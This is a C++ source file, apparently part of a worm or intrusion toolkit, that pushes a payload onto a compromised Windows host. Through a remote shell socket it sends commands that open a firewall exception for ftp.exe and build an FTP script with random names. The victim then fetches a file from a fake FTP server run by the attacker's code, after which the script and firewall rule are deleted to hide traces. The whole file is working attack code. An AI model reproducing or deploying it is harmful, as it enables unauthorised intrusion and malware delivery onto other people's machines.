/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "upload_file_ftp.h"

#include "global.h"
#include "macro.h"
#include "network.h"
#include "tcp.h"
#include "random.h"

#include "memory_debug.h"

UploadFileFtp::UploadFileFtp(const char *originalFile, const char *destinationFile):
	original(originalFile),
	destination(destinationFile){

}

bool UploadFileFtp::upload(SOCKET socket, const char *target){
	std::string privateIp = Global::get().getPrivateIp();
	std::string internetIp = Global::get().getInternetIp();
	std::string publicIp = Global::get().getPublicIp();
	if (strncmp(target, "192.168", 7) == 0){
		MYPRINTF("use private ip\n");
		return exploit(socket, privateIp.c_str(), privateIp.c_str(), target);
	} else {
		MYPRINTF("use internet ip\n");
		return exploit(socket, publicIp.c_str(), internetIp.c_str(), target);
	}
}

#define BUFFER_SIZE 1024

bool UploadFileFtp::exploit(SOCKET socket, const char *localIp, const char *internetIp, const char *target){

	char openLocalIpBuffer[BUFFER_STRING_SIZE];
	char getFileBuffer[BUFFER_STRING_SIZE];
	char userBuffer[BUFFER_STRING_SIZE];
	char binaryBuffer[BUFFER_STRING_SIZE];
	char quitBuffer[BUFFER_STRING_SIZE];
	char execBuffer[BUFFER_STRING_SIZE];
	char delBuffer[BUFFER_STRING_SIZE];

	std::string username = Random::createRandomName(10);
	std::string filename = Random::createRandomName(10);

	sprintf_s(openLocalIpBuffer, BUFFER_STRING_SIZE, "echo open %s> %s\n", internetIp, filename.c_str());
	sprintf_s(userBuffer, BUFFER_STRING_SIZE, "echo %s>> %s\n", username.c_str(), filename.c_str());
	sprintf_s(binaryBuffer, BUFFER_STRING_SIZE, "echo binary>> %s\n", filename.c_str());
	sprintf_s(getFileBuffer, BUFFER_STRING_SIZE, "echo get %s>> %s\n", destination, filename.c_str());
	sprintf_s(quitBuffer, BUFFER_STRING_SIZE, "echo quit>> %s\n", filename.c_str());
	sprintf_s(execBuffer, BUFFER_STRING_SIZE, "ping -n 2 127.0.0.1 & ftp -s:%s\n", filename.c_str());
	sprintf_s(delBuffer, BUFFER_STRING_SIZE, "del %s\n", filename.c_str());

	bool res = true;

	// socket
	char *sendbuf[] = {
		"netsh firewall add allowedprogram c:\\windows\\system32\\ftp.exe FtpServer ENABLE\n",
		openLocalIpBuffer,
		userBuffer,
		userBuffer,
		binaryBuffer,
		getFileBuffer,
		quitBuffer,
		execBuffer,
		delBuffer,
		"netsh firewall delete allowedprogram c:\\windows\\system32\\ftp.exe\n"
	};

	// index for commands to be send
	int commandIndex  = 0;
	// index for buffer used to read response
	int bufferIndex = 0;
	while(commandIndex < 10){
		char *currentCommand = NULL;
		// buffer for response
		char recvbuf[BUFFER_SIZE];
		// don't be too quick
		Sleep(1000);
		int iResult = recv(socket, recvbuf, BUFFER_SIZE, 0);
		if (iResult != -1){
			// some response ?
			Print::printBuffer(recvbuf, iResult);
		}
		currentCommand = sendbuf[commandIndex];
		// send command
		MYPRINTF("command: %s\n", currentCommand);
		iResult = send(socket, currentCommand, (int)strlen(currentCommand), 0 );
		if (commandIndex == 8){
			// open the ftp server
			if (!ftpServer(localIp, target)){
				MYPRINTF("unable to use ftp server\n", currentCommand);
				res = false;
			}
			// wait, the target is executing ftp commands
			Sleep(1000);
		}
		commandIndex++;
	}

	return res;
}

// TODO: not good ! use internet + public ip
bool UploadFileFtp::ftpServer(const char *localIp, const char *target){
	// command in response
	char *sendbuf[] = {
		"220\n",
		"331\n",
		"230\n",
		"200\n",
		"200\n",
		"150\n",
		"226\n"
	};

#define NB_FTP_COMMANDES 7
#define FTP_CMD_INDEX 5

	
	SOCKET clientSocket;
	try {
		Tcp tcp(localIp, 21);
		tcp.tcpbind();
		tcp.tcplisten();
		MYPRINTF("\t\topen ftp server on %s for %s\n", localIp, target);
		MYPRINTF( "\t\twait for a ftp client\n");
		if (!tcp.selectread(10)){
			MYPRINTF("\t\tselect write failed with error: %d\n", WSAGetLastError());
			return false;
		}
		clientSocket = tcp.tcpaccept();
		if (clientSocket == 0){
			return false;
		}
		MYPRINTF("\t\tClient ftp connected.\n");
	} catch(std::exception ex){
		MYPRINTF("exception: %s\n", ex.what());
	}
	// port used by target
	int port = 0;	
	// index for commands to be send
	int commandIndex  = 0;
	// send commands to target
	while(commandIndex < NB_FTP_COMMANDES){
		// buffer for response
		char recvbuf[BUFFER_SIZE];
		char *currentCommand = sendbuf[commandIndex];
		// send command
		int iResult = send( clientSocket, currentCommand, (int)strlen(currentCommand), 0 );
		Sleep(200);
		if (commandIndex == FTP_CMD_INDEX){
			if (port == 0){
				MYPRINTF("port = 0\n");
				closesocket(clientSocket);
				return false;
			}
			// send file to target
			if (!sendfile(target, port, original)){
				MYPRINTF("unable to send file\n");
				closesocket(clientSocket);
				return false;
			}
			commandIndex++;
			currentCommand = sendbuf[commandIndex];
			iResult = send( clientSocket, currentCommand, (int)strlen(currentCommand), 0 );
			Sleep(1000);
			// wait, the target is executing ftp commands
			closesocket(clientSocket);
			return true;
		}
		iResult = recv(clientSocket, recvbuf, BUFFER_SIZE, 0);
		if (iResult != -1){
			// index for buffer used to read response
			int bufferIndex = 0;
			// some response ?
			Print::printBuffer(recvbuf, iResult);
			if (strncmp(recvbuf, "PORT", strlen("PORT")) == 0){
				char *nextToken;
				// used for parsing PORT response
				char* s1 = NULL;
				char* s6 = NULL;
				int i1;
				int i2;

				s1 = strtok_s(recvbuf, ",", &nextToken);
				s1 = strtok_s(NULL, ",", &nextToken);
				s1 = strtok_s(NULL, ",", &nextToken);
				s1 = strtok_s(NULL, ",", &nextToken);
				s1 = strtok_s(NULL, ",", &nextToken);
				s6 = strtok_s(NULL, ",", &nextToken);
				i1 = atoi(s1);
				i2 = atoi(s6);
				port = i1 * 256 + i2;
			}
		}
		commandIndex++;
	}
	closesocket(clientSocket);
	return true;
}

bool UploadFileFtp::sendfile(const char* target, int port, const char *fileName){

	FILE* file;
#define CHUNK_SIZE 512
	char  file_data[CHUNK_SIZE];
	int bytesReadFromFile = 0;

	errno_t err;
	if( (err  = fopen_s( &file, fileName, "rb" )) != 0 ) {
		MYPRINTF("unable to open %s\n", fileName);
		return false;
	}

	MYPRINTF("\t\topen client for %s on %d\n", target, port);

	try {
		Tcp tcp(target, port);

		tcp.tcpconnect();

		if (tcp.selectwrite()){
			while ((bytesReadFromFile = fread(file_data, sizeof(char), CHUNK_SIZE, file)) != 0) {
				//MYPRINTF( "-%d octets lus-", bytesReadFromFile);
				tcp.tcpsend(file_data, bytesReadFromFile);
				if (!tcp.selectwrite()){
					fclose(file);
					return false;
				}
			}
		} else {
			MYPRINTF("unable to select write\n");
			fclose(file);
			return false;
		}
	} catch(std::exception ex) {
		MYPRINTF("exception: %s\n", ex.what());
	}
	fclose(file);
	return true;
}